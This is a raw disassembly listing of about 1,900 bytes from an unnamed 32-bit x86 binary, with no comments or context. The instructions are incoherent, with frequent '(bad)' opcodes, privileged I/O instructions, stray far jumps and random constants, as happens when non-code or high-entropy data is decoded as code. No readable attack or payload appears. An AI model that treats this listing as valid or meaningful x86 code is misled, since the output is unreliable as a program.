  41f4fa:	(bad)  
  41f4fb:	out    0x7d,al
  41f4fd:	sub    dl,BYTE PTR [edi+0x0]
  41f500:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f501:	fldenvw [eax]
  41f504:	and    DWORD PTR [eax+0x39],0xffffffae
  41f508:	cld    
  41f509:	jg     0x41f552
  41f50b:	add    al,0xc1
  41f50d:	or     dl,dl
  41f50f:	xchg   DWORD PTR [edi+0x6b87df9c],ecx
  41f515:	bound  ebx,QWORD PTR [edx+ebp*2+0x2f97cc6a]
  41f51c:	sub    edx,esi
  41f51e:	pop    ecx
  41f51f:	and    eax,0x6ecfec93
  41f524:	mov    ss,WORD PTR [ebx-0x7b]
  41f527:	scas   eax,DWORD PTR es:[edi]
  41f528:	lea    esi,[ecx]
  41f52a:	dec    esi
  41f52b:	xchg   al,bl
  41f52d:	mov    eax,0x8ccbd0d4
  41f532:	pop    edx
  41f533:	push   edi
  41f534:	(bad)  
  41f535:	mov    eax,0x50e8fdff
  41f53a:	or     DWORD PTR [edi],0xec642bbd
  41f540:	into   
  41f541:	icebp  
  41f542:	xchg   esp,eax
  41f543:	mov    ah,0x2a
  41f545:	aas    
  41f546:	xor    eax,0xf1be0ce5
  41f54b:	sbb    BYTE PTR [edx-0x2c],0x26
  41f54f:	popf   
  41f550:	sbb    DWORD PTR [ebx+0x10],ebx
  41f553:	cmp    cl,al
  41f555:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f556:	and    BYTE PTR [edx-0x61],dh
  41f559:	shl    DWORD PTR [esi-0x1e],1
  41f55c:	aas    
  41f55d:	ss pop ds
  41f55f:	dec    ebp
  41f560:	popf   
  41f561:	adc    DWORD PTR [esi],edi
  41f563:	je     0x41f575
  41f565:	add    DWORD PTR [ebp+ecx*4+0x23f3a309],ecx
  41f56c:	push   ecx
  41f56d:	fst    DWORD PTR [ebp-0x5c]
  41f570:	outs   dx,DWORD PTR ds:[esi]
  41f571:	inc    edx
  41f572:	pop    ebp
  41f573:	xchg   bl,bh
  41f575:	inc    ebx
  41f576:	push   ecx
  41f577:	fwait
  41f578:	mov    bl,0xa1
  41f57a:	sbb    al,0xdf
  41f57c:	pushf  
  41f57d:	rcr    edx,cl
  41f57f:	inc    ebx
  41f580:	adc    BYTE PTR [ecx+0x2d],bl
  41f583:	add    ecx,esp
  41f585:	leave  
  41f586:	inc    ebx
  41f587:	inc    ebp
  41f588:	fst    QWORD PTR [ecx+ecx*4+0xa]
  41f58c:	xchg   edx,esi
  41f58e:	mov    dl,BYTE PTR [ebp+0x2d]
  41f591:	cwde   
  41f592:	xor    ah,BYTE PTR [ecx-0x16]
  41f595:	or     dl,BYTE PTR [ebp+0x4666b34]
  41f59b:	test   BYTE PTR ds:0xfc277a2c,ch
  41f5a1:	rol    BYTE PTR [eax+0x2148359],cl
  41f5a7:	jne    0x41f618
  41f5a9:	outs   dx,DWORD PTR ds:[esi]
  41f5aa:	pop    edi
  41f5ab:	fcmovnbe st,st(5)
  41f5ad:	sub    ebp,edx
  41f5af:	jnp    0x41f55e
  41f5b1:	mov    esp,DWORD PTR [esi-0x72]
  41f5b4:	iret   
  41f5b5:	xchg   esi,eax
  41f5b6:	pop    esp
  41f5b7:	jmp    0xfec635f4
  41f5bc:	push   cs
  41f5bd:	fbld   TBYTE PTR [ecx]
  41f5bf:	mov    cl,0x22
  41f5c1:	scas   eax,DWORD PTR es:[edi]
  41f5c2:	icebp  
  41f5c3:	inc    eax
  41f5c4:	inc    BYTE PTR [ebx+0x6628d1dc]
  41f5ca:	xchg   ch,dh
  41f5cc:	rcl    BYTE PTR [ebp+0x6237abfd],1
  41f5d2:	mov    eax,0xcdec11f2
  41f5d7:	icebp  
  41f5d8:	in     al,dx
  41f5d9:	xchg   esi,eax
  41f5da:	imul   edi,ecx,0xffffffd0
  41f5dd:	int3   
  41f5de:	dec    edx
  41f5df:	enter  0xf74a,0xb7
  41f5e3:	test   al,0x9d
  41f5e5:	pushf  
  41f5e6:	icebp  
  41f5e7:	cvtps2pd xmm2,QWORD PTR [edx]
  41f5ea:	(bad)  
  41f5eb:	cld    
  41f5ec:	or     ecx,DWORD PTR [esi+eiz*4-0x70]
  41f5f0:	or     dl,cl
  41f5f2:	test   DWORD PTR [ebp+0x6b],eax
  41f5f5:	ins    DWORD PTR es:[edi],dx
  41f5f6:	pminub mm0,QWORD PTR [edi]
  41f5f9:	push   ds
  41f5fa:	mov    ah,0xbc
  41f5fc:	sbb    ah,BYTE PTR [ebp+0x1e]
  41f5ff:	sbb    BYTE PTR [ebx+0x2f],dl
  41f602:	or     bl,al
  41f604:	or     edx,DWORD PTR [ebx-0x1]
  41f607:	shl    DWORD PTR [edx+0x12],0x5e
  41f60b:	adc    esi,DWORD PTR [esi-0x2b]
  41f60e:	adc    eax,0x604497dc
  41f613:	pop    edx
  41f614:	push   eax
  41f615:	or     dl,BYTE PTR [esi]
  41f617:	loopne 0x41f609
  41f619:	sahf   
  41f61a:	ins    BYTE PTR es:[edi],dx
  41f61b:	(bad)  
  41f61c:	lods   al,BYTE PTR ds:[esi]
  41f61d:	hlt    
  41f61e:	sub    al,BYTE PTR [edx-0x41304e8b]
  41f624:	jb     0x41f68b
  41f626:	cmp    dl,al
  41f628:	adc    BYTE PTR [eax],dh
  41f62a:	in     eax,0x73
  41f62c:	idiv   BYTE PTR [ebx-0x172ae82e]
  41f632:	sahf   
  41f633:	std    
  41f634:	add    BYTE PTR [ebx],0xea
  41f637:	push   cs
  41f638:	xor    edx,ebx
  41f63a:	ret    0xffca
  41f63d:	stc    
  41f63e:	pop    esp
  41f63f:	je     0x41f5c5
  41f641:	arpl   WORD PTR [ecx+0xb],si
  41f644:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f645:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f646:	je     0x41f5ef
  41f648:	or     BYTE PTR [esi-0x3c1fbbff],dl
  41f64e:	mov    DWORD PTR [eax+0x69eda459],ebp
  41f654:	pop    ebx
  41f655:	and    BYTE PTR [eax-0x36],0xb1
  41f659:	(bad)  
  41f65a:	mov    dl,0x6d
  41f65c:	(bad)  
  41f65d:	cmp    bl,al
  41f65f:	fnstsw WORD PTR [ebx+eax*1-0x66]
  41f663:	test   DWORD PTR [edx],esp
  41f665:	addr16 icebp 
  41f667:	mov    ecx,0xbdd7f9eb
  41f66c:	xchg   ecx,eax
  41f66d:	dec    esp
  41f66e:	push   esi
  41f66f:	xchg   esi,eax
  41f670:	mov    ch,BYTE PTR [ecx]
  41f672:	outs   dx,BYTE PTR ds:[esi]
  41f673:	sbb    ecx,ebp
  41f675:	jno    0x41f6ea
  41f677:	fcomi  st,st(7)
  41f679:	cmp    edx,DWORD PTR [ecx-0x34ded3be]
  41f67f:	sbb    BYTE PTR [ebx+0x7e],0x9e
  41f683:	fimul  DWORD PTR [ecx-0x66ea5b9]
  41f689:	fidiv  DWORD PTR [ecx-0x493a56b7]
  41f68f:	lahf   
  41f690:	jmp    FWORD PTR [edi-0x49ea3479]
  41f696:	in     al,dx
  41f697:	rol    DWORD PTR [edi+0x6c6632b8],1
  41f69d:	lds    ecx,FWORD PTR [ebx]
  41f69f:	ret    
  41f6a0:	jmp    0x8c13:0x92b06358
  41f6a7:	mov    eax,ds:0x505447a6
  41f6ac:	jp     0x41f6b2
  41f6ae:	lods   al,BYTE PTR ds:[esi]
  41f6af:	sahf   
  41f6b0:	jmp    0x6c06f9f0
  41f6b5:	aam    0xbf
  41f6b7:	cs push 0x83369770
  41f6bd:	pop    esi
  41f6be:	loop   0x41f6eb
  41f6c0:	push   esi
  41f6c1:	cld    
  41f6c2:	jae    0x41f73d
  41f6c4:	push   eax
  41f6c5:	mov    dl,0x4f
  41f6c7:	inc    esp
  41f6c8:	data16 xchg BYTE PTR [edx],ah
  41f6cb:	jb     0x41f727
  41f6cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6ce:	xchg   ebx,eax
  41f6cf:	shl    BYTE PTR [ebp-0x6b],1
  41f6d2:	retf   0x293
  41f6d5:	das    
  41f6d6:	mov    eax,ds:0xccb6ec46
  41f6db:	sub    esp,edx
  41f6dd:	sub    DWORD PTR [esi+eax*1],edi
  41f6e0:	add    al,0x3e
  41f6e2:	pop    edx
  41f6e3:	sti    
  41f6e4:	or     bl,ch
  41f6e6:	repz cld 
  41f6e8:	cmp    DWORD PTR [bp+si-0x5d],esp
  41f6ec:	ret    
  41f6ed:	xchg   esi,ebp
  41f6ef:	push   0xfffffff5
  41f6f1:	ins    BYTE PTR es:[edi],dx
  41f6f2:	jb     0x41f6e0
  41f6f4:	mov    ch,0x2f
  41f6f6:	push   ds
  41f6f7:	iret   
  41f6f8:	jb     0x41f6df
  41f6fa:	dec    edx
  41f6fb:	pshufw mm5,QWORD PTR [ecx+ecx*8+0x4c432cc7],0x24
  41f704:	pop    edx
  41f705:	mov    edx,0xff6840c
  41f70a:	outs   dx,DWORD PTR ds:[esi]
  41f70b:	jnp    0x41f787
  41f70d:	inc    edi
  41f70e:	sub    eax,0xfc73b11
  41f713:	push   esi
  41f714:	fs ins BYTE PTR es:[edi],dx
  41f716:	xlat   BYTE PTR ds:[ebx]
  41f717:	scas   eax,DWORD PTR es:[edi]
  41f718:	add    DWORD PTR [esi-0x45],0xffffffdc
  41f71c:	cmp    ebx,DWORD PTR [esi]
  41f71e:	pop    edi
  41f71f:	sbb    eax,0x55cd812a
  41f724:	jmp    0x891f:0x48ccf6ac
  41f72b:	daa    
  41f72c:	pop    ss
  41f72d:	pop    ebp
  41f72e:	call   0x1171:0xeab40797
  41f735:	adc    BYTE PTR [ebx-0x60],ah
  41f738:	call   0xcafd:0x6a39d896
  41f73f:	mov    cl,0x14
  41f741:	jmp    0x6ed9cadb
  41f746:	sbb    al,0xc
  41f748:	fsubr  DWORD PTR [ebp-0x6debb9d]
  41f74e:	xchg   ecx,eax
  41f74f:	ret    0xf8b6
  41f752:	aad    0xa3
  41f754:	hlt    
  41f755:	and    dh,BYTE PTR [ecx+eax*4-0x79]
  41f759:	mov    dh,0x8d
  41f75b:	mov    edi,DWORD PTR [ebx-0x72]
  41f75e:	bound  esp,QWORD PTR [eax+0x13]
  41f761:	in     al,dx
  41f762:	loop   0x41f74f
  41f764:	arpl   WORD PTR [ebx-0x448deada],bx
  41f76a:	lds    edx,FWORD PTR [edx]
  41f76c:	lahf   
  41f76d:	mov    esp,0xf127e133
  41f772:	inc    eax
  41f773:	push   0xffffffd9
  41f775:	and    eax,0x73d57d40
  41f77a:	add    ah,BYTE PTR [esi]
  41f77c:	xchg   BYTE PTR [ecx-0x40],al
  41f77f:	mov    esi,0x58c88ab
  41f784:	adc    DWORD PTR [edi+0x44],ebx
  41f787:	push   cs
  41f788:	loope  0x41f7ca
  41f78a:	sub    eax,0xb84cf401
  41f78f:	sub    bl,BYTE PTR [edi]
  41f791:	mov    BYTE PTR [edx+0x5],0xf3
  41f795:	int3   
  41f796:	and    esi,ebx
  41f798:	sub    al,0x21
  41f79a:	loopne 0x41f771
  41f79c:	xchg   ecx,eax
  41f79d:	lock pop edx
  41f79f:	out    0x15,eax
  41f7a1:	jns    0x41f7e6
  41f7a3:	(bad)  
  41f7a4:	lahf   
  41f7a5:	pop    edx
  41f7a6:	addr16 fs push 0x43d9e544
  41f7ad:	gs xchg ecx,edx
  41f7b0:	jns    0x41f7da
  41f7b2:	sar    BYTE PTR [ecx-0x3b],0x4c
  41f7b6:	(bad)  
  41f7b7:	cmp    al,0x88
  41f7b9:	outs   dx,DWORD PTR ds:[esi]
  41f7ba:	and    eax,0x54b1bab
  41f7bf:	add    dl,bh
  41f7c1:	(bad)  
  41f7c2:	adc    DWORD PTR [esi],ebp
  41f7c4:	(bad)  
  41f7c5:	ins    BYTE PTR es:[edi],dx
  41f7c6:	sub    BYTE PTR [esi+edx*1+0x68bb6c1e],dh
  41f7cd:	pop    ecx
  41f7ce:	push   0x25
  41f7d0:	jle    0x41f7f4
  41f7d2:	test   BYTE PTR [esi],ch
  41f7d4:	and    esi,ebp
  41f7d6:	mov    dl,0xf9
  41f7d8:	jmp    0x5a8c:0xba55f30f
  41f7df:	adc    BYTE PTR [ebp-0x64b74c47],0x8
  41f7e6:	aas    
  41f7e7:	aad    0x1b
  41f7e9:	pop    ecx
  41f7ea:	add    esp,DWORD PTR [ebp+ecx*8-0x2f]
  41f7ee:	mov    ds:0x10855638,al
  41f7f3:	das    
  41f7f4:	lock mov eax,0xf4ac04ac
  41f7fa:	pop    esp
  41f7fb:	mov    ebx,0x75ecd763
  41f800:	or     al,0x57
  41f802:	inc    edi
  41f803:	fwait
  41f804:	out    dx,al
  41f805:	add    al,0x9f
  41f807:	xchg   esi,eax
  41f808:	(bad)  
  41f809:	pushf  
  41f80a:	shld   DWORD PTR [ecx+0x58],esi,cl
  41f80e:	add    eax,0x18f16552
  41f813:	sahf   
  41f814:	mov    esi,edi
  41f816:	or     eax,0x3a3991fb
  41f81b:	call   0xe6841408
  41f820:	and    eax,0x43e52c71
  41f825:	inc    eax
  41f826:	rcl    BYTE PTR [ebx],0x97
  41f829:	mov    ds:0x730d87af,al
  41f82e:	leave  
  41f82f:	cmp    edx,DWORD PTR ds:0xc374b5f
  41f835:	jmp    0xd049177d
  41f83a:	imul   ebp,ebx,0x3b1dc300
  41f840:	xchg   edi,eax
  41f841:	(bad)  
  41f842:	shr    BYTE PTR [edi-0x235cc017],0x94
  41f849:	lahf   
  41f84a:	push   es
  41f84b:	lea    eax,[ebx+0x7cc9bc78]
  41f851:	push   0xd
  41f853:	jg     0x41f8af
  41f855:	xchg   ecx,eax
  41f856:	inc    ebx
  41f857:	sbb    ebp,DWORD PTR [ebx+edi*4-0x365fa293]
  41f85e:	jge    0x41f828
  41f860:	stos   BYTE PTR es:[edi],al
  41f861:	shl    BYTE PTR ss:[eax+0xa],cl
  41f865:	leave  
  41f866:	jg     0x60d806c3
  41f86c:	repz scas eax,DWORD PTR es:[edi]
  41f86e:	lock adc eax,0x7020f647
  41f874:	jmp    0x7e4c:0xf898337a
  41f87b:	(bad)  
  41f87c:	sti    
  41f87d:	in     eax,dx
  41f87e:	pop    esp
  41f87f:	out    dx,eax
  41f880:	pop    ss
  41f881:	mov    edx,0x19e1a8b7
  41f886:	jmp    0x41f89e
  41f888:	push   0x3073c140
  41f88d:	or     bh,BYTE PTR [ecx+0x2a8117c8]
  41f893:	shl    DWORD PTR [edx],cl
  41f895:	hlt    
  41f896:	call   0x19c22765
  41f89b:	pop    eax
  41f89c:	pop    eax
  41f89d:	mov    ecx,0x89fc5e3d
  41f8a2:	push   ebp
  41f8a3:	inc    eax
  41f8a4:	sub    dh,BYTE PTR [edx-0x6a]
  41f8a7:	faddp  st(7),st
  41f8a9:	pop    eax
  41f8aa:	pop    ebx
  41f8ab:	rcl    BYTE PTR [esp+edx*2-0xd577b9f],1
  41f8b2:	imul   ebx,DWORD PTR [ebx+0x6cccd0ae],0xffffffb0
  41f8b9:	iret   
  41f8ba:	sbb    al,0xdd
  41f8bc:	xor    al,0xfe
  41f8be:	cmp    BYTE PTR [esi+0x56507353],dl
  41f8c4:	cli    
  41f8c5:	jmp    0xb825:0x477705de
  41f8cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8cd:	fwait
  41f8ce:	cld    
  41f8cf:	stc    
  41f8d0:	ds inc esp
  41f8d2:	jp     0x41f92d
  41f8d4:	mov    cl,0xa0
  41f8d6:	std    
  41f8d7:	jg     0x41f8aa
  41f8d9:	ficom  DWORD PTR [edi+ecx*8-0x1aa1c789]
  41f8e0:	push   esp
  41f8e1:	push   eax
  41f8e2:	cmp    edi,DWORD PTR [eax+edi*4]
  41f8e5:	dec    ecx
  41f8e6:	push   es
  41f8e7:	mov    dl,0xa0
  41f8e9:	fwait
  41f8ea:	mov    edi,0x26066409
  41f8ef:	push   ss
  41f8f0:	mov    ebp,DWORD PTR [esi+0x46]
  41f8f3:	mov    al,0x22
  41f8f5:	je     0x41f8e4
  41f8f7:	pop    DWORD PTR [edi+0x288b7137]
  41f8fd:	cld    
  41f8fe:	pushf  
  41f8ff:	mov    al,0x23
  41f901:	pop    edi
  41f902:	stc    
  41f903:	or     DWORD PTR [edx+0x336dea1b],edi
  41f909:	and    dh,BYTE PTR [ebx+0x6e]
  41f90c:	add    ebx,DWORD PTR [edi+0x4ebf3020]
  41f912:	sub    DWORD PTR [edx],ecx
  41f914:	shr    BYTE PTR [edi-0x187ea435],cl
  41f91a:	call   ebp
  41f91c:	dec    ebp
  41f91d:	sbb    BYTE PTR [eax+0x64],cl
  41f920:	call   0x4320:0x7667d7b1
  41f927:	jl     0x41f998
  41f929:	pusha  
  41f92a:	aam    0xab
  41f92c:	imul   ebp,DWORD PTR [esi-0x34],0x6af63802
  41f933:	aaa    
  41f934:	imul   edi,DWORD PTR [ebx-0x517dff0a],0xfffffff4
  41f93b:	int3   
  41f93c:	mov    ds:0xfb8735b0,al
  41f941:	lea    esp,[eax+ebp*4+0x32]
  41f945:	sbb    al,0xbd
  41f947:	xchg   ebx,eax
  41f948:	dec    ebp
  41f949:	mov    eax,0x5e423938
  41f94e:	mov    ebx,0x6ccc65b7
  41f953:	sbb    DWORD PTR [ebx+eax*1],edi
  41f956:	jle    0x41f96e
  41f958:	push   esp
  41f959:	rcl    ebp,cl
  41f95b:	enter  0x9e56,0x84
  41f95f:	mov    ds:0x4833309b,eax
  41f964:	xchg   ebx,eax
  41f965:	jbe    0x41f993
  41f967:	jne    0x41f979
  41f969:	jg     0x41f8f8
  41f96b:	out    dx,eax
  41f96c:	jp     0x41f97d
  41f96e:	les    esi,FWORD PTR [ecx+eiz*1]
  41f971:	sub    eax,0x397f1ee
  41f976:	jne    0x41f9f5
  41f978:	daa    
  41f979:	cmp    bl,dl
  41f97b:	jle    0x41f9e1
  41f97d:	retf   
  41f97e:	push   ecx
  41f97f:	add    bh,dl
  41f981:	jae    0x41f9e3
  41f983:	loop   0x41f936
  41f985:	jmp    0x41f9dc
  41f987:	or     DWORD PTR [edi],0x2baf3e05
  41f98d:	sbb    ebp,DWORD PTR [ebx-0x439433be]
  41f993:	div    DWORD PTR [edi]
  41f995:	push   es
  41f996:	add    DWORD PTR [esi-0x2f],edi
  41f999:	daa    
  41f99a:	pop    ebp
  41f99b:	and    bl,dh
  41f99d:	(bad)
  41f9a1:	test   eax,0xcf0e2679
  41f9a6:	jl     0x41f933
  41f9a8:	mov    ch,0x7c
  41f9aa:	and    ch,ch
  41f9ac:	mov    ds:0x636395ae,eax
  41f9b1:	sub    al,0x40
  41f9b3:	cmp    bh,dl
  41f9b5:	fstp   TBYTE PTR [ecx+0x48715a3e]
  41f9bb:	stc    
  41f9bc:	jno    0x41f9b6
  41f9be:	and    BYTE PTR [ebx-0x75],ah
  41f9c1:	add    DWORD PTR [ebp+edx*1-0x1c5f8c6c],0x13074b62
  41f9cc:	xchg   ebx,eax
  41f9cd:	xchg   edi,eax
  41f9ce:	neg    DWORD PTR [esi+0x164e1c07]
  41f9d4:	cs stc 
  41f9d6:	add    DWORD PTR [edi+ebx*4+0x470324d6],edi
  41f9dd:	test   al,0x3b
  41f9df:	aad    0xac
  41f9e1:	shr    DWORD PTR [eax],1
  41f9e3:	jbe    0x41f9d9
  41f9e5:	call   0x5056:0xb162511c
  41f9ec:	je     0x3b918158
  41f9f2:	jne    0x41f9b0
  41f9f4:	mov    ecx,0xcca804bd
  41f9f9:	imul   ecx,DWORD PTR [edi-0x4c],0x48
  41f9fd:	out    0xf2,al
  41f9ff:	sub    al,0x99
  41fa01:	push   esi
  41fa02:	mov    eax,ds:0x47c1cbe9
  41fa07:	or     BYTE PTR [edx-0x4d],al
  41fa0a:	inc    edi
  41fa0b:	lods   al,BYTE PTR ds:[esi]
  41fa0c:	in     eax,dx
  41fa0d:	xchg   esi,eax
  41fa0e:	bound  ecx,QWORD PTR [ecx+0x4dc85e7f]
  41fa14:	cdq    
  41fa15:	mov    esi,0x26d3bd6d
  41fa1a:	iret   
  41fa1b:	jg     0x41fa1f
  41fa1d:	jbe    0x41fa60
  41fa1f:	dec    esi
  41fa20:	fdiv   st,st(2)
  41fa22:	sub    BYTE PTR [edx+0x40f22423],dl
  41fa28:	mov    eax,ds:0x716d39d7
  41fa2d:	mov    dh,0x5d
  41fa2f:	pop    ecx
  41fa30:	xchg   ebx,eax
  41fa31:	lods   al,BYTE PTR cs:[esi]
  41fa33:	addr16 adc ebp,ecx
  41fa36:	call   0x6c58:0x2d12c3e7
  41fa3d:	pop    edi
  41fa3e:	inc    ebx
  41fa3f:	xor    ah,BYTE PTR [eax-0x4326888a]
  41fa45:	cwde   
  41fa46:	and    eax,0xeb43ff37
  41fa4b:	fs push eax
  41fa4d:	sub    DWORD PTR [esi-0x65eec147],edi
  41fa53:	push   cs
  41fa54:	ret    0xecde
  41fa57:	xchg   edi,eax
  41fa58:	mov    dl,0x1a
  41fa5a:	push   es
  41fa5b:	cmovle ebp,DWORD PTR [esi]
  41fa5e:	and    al,0xc9
  41fa60:	mov    gs:0x74302462,eax
  41fa66:	call   0x2521:0x72576776
  41fa6d:	xor    DWORD PTR [edi],ecx
  41fa6f:	jbe    0x41fa59
  41fa71:	arpl   WORD PTR [ebx-0x77fdc9b],bx
  41fa77:	rcl    BYTE PTR [ebx],1
  41fa79:	jno    0x41fa1f
  41fa7b:	sbb    al,0x1d
  41fa7d:	mov    DWORD PTR [ecx+0x14],edi
  41fa80:	xchg   ecx,eax
  41fa81:	cwde   
  41fa82:	cmp    eax,0x31515be2
  41fa87:	mov    eax,ds:0xf2575112
  41fa8c:	jo     0x41fae6
  41fa8e:	int3   
  41fa8f:	ins    DWORD PTR es:[edi],dx
  41fa90:	aad    0x71
  41fa92:	mov    dh,0x60
  41fa94:	inc    esp
  41fa95:	lahf   
  41fa96:	jnp    0x41fa83
  41fa98:	push   edi
  41fa99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa9a:	pop    ss
  41fa9b:	and    ebp,DWORD PTR [eax]
  41fa9d:	cwde   
  41fa9e:	fist   WORD PTR [ecx+0x55c6229a]
  41faa4:	sub    eax,0x8208a62f
  41faa9:	mov    edi,0xcbe8a000
  41faae:	fisub  WORD PTR [edx-0xf]
  41fab1:	push   ss
  41fab2:	xor    cl,cl
  41fab4:	dec    edx
  41fab5:	sbb    esp,DWORD PTR [edx]
  41fab7:	out    0x95,eax
  41fab9:	pop    ecx
  41faba:	lahf   
  41fabb:	and    ch,bl
  41fabd:	adc    DWORD PTR [ebx-0x31e95f1b],ecx
  41fac3:	test   DWORD PTR [ecx-0x280741a5],edi
  41fac9:	enter  0x75a7,0x35
  41facd:	inc    ebx
  41face:	xchg   esp,eax
  41facf:	add    esi,DWORD PTR [ebx+0x19]
  41fad2:	sbb    dh,BYTE PTR [ebx+edi*1+0x2d]
  41fad6:	in     al,0x77
  41fad8:	outs   dx,DWORD PTR ds:[esi]
  41fad9:	retf   0x363b
  41fadc:	mov    edx,0xf1810c75
  41fae1:	dec    esi
  41fae2:	jns    0x41fad8
  41fae4:	cmp    ah,BYTE PTR [esi-0x9]
  41fae7:	sub    al,0x78
  41fae9:	pop    esp
  41faea:	shr    BYTE PTR [ebx+0x8],1
  41faed:	push   ds
  41faee:	lahf   
  41faef:	mov    ds:0x4485cb9a,al
  41faf4:	inc    ebx
  41faf5:	addr16 dec ebx
  41faf7:	div    DWORD PTR [edi]
  41faf9:	in     al,dx
  41fafa:	(bad)  
  41fafc:	repnz and BYTE PTR [edx-0x10],dh
  41fb00:	mov    al,BYTE PTR [edi]
  41fb02:	pushf  
  41fb03:	jge    0x41faf3
  41fb05:	das    
  41fb06:	enter  0xa581,0x7
  41fb0a:	dec    eax
  41fb0b:	pop    edi
  41fb0c:	pop    eax
  41fb0d:	or     dh,BYTE PTR [ecx]
  41fb0f:	push   ebp
  41fb10:	sbb    DWORD PTR [ecx],esp
  41fb12:	enter  0xce1e,0x49
  41fb16:	adc    eax,0x10f9275e
  41fb1b:	mov    esp,0x41f3ab48
  41fb20:	aaa    
  41fb21:	push   eax
  41fb22:	mov    al,ds:0x9fa70646
  41fb27:	rol    edx,0xc7
  41fb2a:	sbb    bl,dl
  41fb2c:	inc    eax
  41fb2d:	neg    BYTE PTR [edi-0x71]
  41fb30:	inc    ecx
  41fb31:	aad    0x9f
  41fb33:	sub    edx,DWORD PTR [edi]
  41fb35:	in     eax,0x83
  41fb37:	jge    0x41fac6
  41fb39:	cmp    esp,ebp
  41fb3b:	pop    eax
  41fb3c:	xor    al,0x46
  41fb3e:	out    0xb7,eax
  41fb40:	mov    ah,0x5e
  41fb42:	adc    al,BYTE PTR fs:[edx-0x6b]
  41fb46:	sub    eax,0x7d54a5f0
  41fb4b:	das    
  41fb4c:	mov    esp,DWORD PTR [ecx+0x6d]
  41fb4f:	cmp    BYTE PTR [edi+0x76774b66],bh
  41fb55:	push   cs
  41fb56:	lock (bad) 
  41fb58:	in     al,dx
  41fb59:	sti    
  41fb5a:	push   edx
  41fb5b:	xor    eax,0xe407e19
  41fb60:	iret   
  41fb61:	(bad)  
  41fb62:	push   ecx
  41fb63:	arpl   WORD PTR [ecx-0x6d],di
  41fb66:	xchg   esp,eax
  41fb67:	lahf   
  41fb68:	sub    DWORD PTR [esi+0xcd51db1],edi
  41fb6e:	xchg   cx,ax
  41fb70:	xchg   BYTE PTR [ecx],al
  41fb72:	mov    eax,ds:0x2aa0f42e
  41fb77:	fcom   DWORD PTR [ecx+ecx*4+0x10]
  41fb7b:	(bad)  
  41fb7c:	xchg   edx,eax
  41fb7d:	scas   eax,DWORD PTR es:[edi]
  41fb7e:	or     DWORD PTR [eax+0xec842b2],0x5717b280
  41fb88:	dec    ebx
  41fb89:	mov    ch,0x17
  41fb8b:	add    ah,BYTE PTR [edi+0xf]
  41fb8e:	mov    ds:0x89ad5eb1,al
  41fb93:	pop    edi
  41fb94:	cmp    BYTE PTR [edx],ah
  41fb96:	pop    ebp
  41fb97:	add    DWORD PTR [ebp+0x7a2ed916],edx
  41fb9d:	loopne 0x41fbe5
  41fb9f:	ins    BYTE PTR es:[edi],dx
  41fba0:	ror    DWORD PTR [ebx-0x19],cl
  41fba3:	push   0x5558d554
  41fba8:	push   cs
  41fba9:	aam    0x8a
  41fbab:	add    dh,BYTE PTR [edi]
  41fbad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbae:	aaa    
  41fbaf:	cdq    
  41fbb0:	sbb    BYTE PTR [ecx],al
  41fbb2:	cwde   
  41fbb3:	enter  0xd1f1,0xd7
  41fbb7:	sar    BYTE PTR [edx],cl
  41fbb9:	retf   0xe4f3
  41fbbc:	ss dec eax
  41fbbe:	test   eax,0x443f1393
  41fbc3:	je     0x41fb78
  41fbc5:	arpl   WORD PTR [edi],si
  41fbc7:	lods   eax,DWORD PTR ds:[esi]
  41fbc8:	or     ch,BYTE PTR [esi+0xe2813d2]
  41fbce:	dec    ebp
  41fbcf:	bound  edx,QWORD PTR ss:[edx]
  41fbd2:	inc    eax
  41fbd3:	xor    DWORD PTR [ebx+eiz*8+0x41c93dbe],0xaf227128
  41fbde:	and    DWORD PTR [edx],ebx
  41fbe0:	jmp    0x5ce2c18f
  41fbe5:	add    ecx,ecx
  41fbe7:	jge    0x41fb9c
  41fbe9:	push   edi
  41fbea:	dec    ebx
  41fbeb:	in     eax,0x52
  41fbed:	inc    eax
  41fbee:	(bad)  
  41fbef:	in     eax,0x8b
  41fbf1:	out    0xa1,al
  41fbf3:	stos   DWORD PTR es:[edi],eax
  41fbf4:	shl    DWORD PTR [ebp-0x4d5dd9],0x83
  41fbfb:	jp     0x41fc78
  41fbfd:	and    ch,BYTE PTR [edx+esi*4-0x71]
  41fc01:	jge    0x41fbad
  41fc03:	pushf  
  41fc04:	lahf   
  41fc05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc06:	or     DWORD PTR [ebp-0x363abdb7],0x8aa17381
  41fc10:	ret    
  41fc11:	inc    esp
  41fc12:	lahf   
  41fc13:	mov    ecx,0xbda251ee
  41fc18:	mov    BYTE PTR [edx+0x2583b722],cl
  41fc1e:	pop    esi
  41fc1f:	aas    
  41fc20:	pop    ebp
  41fc21:	and    DWORD PTR [edx+0x69bb49d0],edx
  41fc27:	call   0x16f0:0x4779f05c
  41fc2e:	call   0xdf1bf942
  41fc33:	mov    eax,0x4afe1c70
  41fc38:	mov    bl,bh
  41fc3a:	cld    
  41fc3b:	cmc    
  41fc3c:	rcl    bl,cl
  41fc3e:	mov    ds:0xf264d8e8,al
  41fc43:	int3   
  41fc44:	jae    0x41fcb4
  41fc46:	mov    DWORD PTR [ebp+0x1af5c59a],eax
  41fc4c:	cld    
  41fc4d:	int3   
  41fc4e:	dec    edx
  41fc4f:	es add eax,0x1e9d6584
  41fc55:	shl    ah,cl
  41fc57:	push   0xffffffb1
  41fc59:	cld    
  41fc5a:	cwde   
  41fc5b:	nop
  41fc5c:	es or  eax,0x18a545d9
  41fc62:	fsubp  st(5),st
  41fc64:	push   esi
  41fc65:	std    
  41fc66:	fs and al,0x23
  41fc69:	jl     0x41fcd9
  41fc6b:	(bad)  
  41fc6c:	pop    eax
  41fc6d:	rcl    BYTE PTR [ebx-0x6],1
  41fc70:	fwait
  41fc71:	jg     0x41fc51
  41fc73:	call   0xb138:0x9dc6f71c
  41fc7a:	cli    
  41fc7b:	push   0xffffffd2
  41fc7d:	rcl    BYTE PTR [esi],cl
  41fc7f:	inc    ebx
  41fc80:	push   ss
  41fc81:	jmp    0x41fca0
  41fc83:	sti    
  41fc84:	dec    esi
  41fc85:	inc    edx
  41fc86:	(bad)  
